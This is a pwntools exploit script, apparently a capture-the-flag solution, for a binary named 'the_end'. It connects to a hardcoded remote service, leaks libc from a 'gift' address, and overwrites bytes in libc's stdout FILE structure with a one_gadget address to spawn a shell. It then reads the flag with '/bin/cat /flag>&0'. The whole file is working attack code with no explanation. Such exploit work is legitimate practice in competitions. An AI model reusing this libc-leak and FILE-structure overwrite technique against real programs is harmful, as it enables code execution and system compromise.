#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools
import time
import os

IP = "150.109.44.250"
PORT = 20002

one_gg = 0xf02a4

context.arch = "amd64"
context.log_level = 'DEBUG'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
BIN = "./the_end"

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    io = remote(IP, PORT)  
    rud("Input your token:")
    sel("7024ZEBXOyaCi7hWLskq2GKI1NUczUay")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif args.local:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN,  env=env)
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), BIN))]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

rud("here is a gift")
sleep_addr = int(rud(",").strip(","), 16)
libc.address = sleep_addr - libc.symbols["sleep"]
lg("libc address", libc.address)
lg("one_gadget", libc.address+one_gg)

target1_got = 0x3c53e0 + libc.address
target2 = libc.address + one_gg
addr1 = libc.symbols["_IO_2_1_stdout_"] + 0xd8

# pad1 = p64(addr1) + p8(target1_got & 0xff)
pad2 = p64(addr1 +1) + p8((target1_got >> 8) & 0xff)
pad3 = p64(libc.address + 0x3c53e0 + 0x18) + p8(target2 & 0xff)
pad4 = p64(libc.address + 0x3c53e0 + 0x18 + 1) + p8((target2 >> 8) & 0xff)
pad5 = p64(libc.address + 0x3c53e0 + 0x18 + 2) + p8((target2 >> 16) & 0xff)
pad6 = p64(libc.symbols["_IO_2_1_stdout_"] + 0x28) + \
    p8(0x20)  
# io.send(pad1)
io.send(pad2)
io.send(pad3)
io.send(pad4)


# gdb.attach(io, '''
# b *0x{:x}
# c
# b *0x{:x}
# b *0x{:x}
# b *exit
# b *_IO_new_file_finish
# b *_IO_new_file_overflow
# b *__GI__IO_file_close
# b *_IO_flush_all_lockp
# b *(0x00007ffff7a0d000 + 0x000000000007C16D)
# p/x &__free_hook
# p/x &_IO_2_1_stdout_
# p/x 0x00007ffff7a0d000 + 0x{:x}
# '''.format(
#     0x0000555555554000 + 0x000000000000093A,  # read1
#     0x0000555555554000 + 0x0000000000000950,  # read2
#     # 0x555555554000 + 0x0000000000000740,  # stdout
#     # 0x555555554000 + 0x0000000000000921,  # printf
#     # 0x555555554000 + 0x00000000000007AE,  # stdout compare
#     0x00007ffff7a0d000 + one_gg,
#     one_gg,
# )
# )
io.send(pad5)
io.send(pad6)

io.sendline("/bin/cat /flag>&0")
io.interactive()
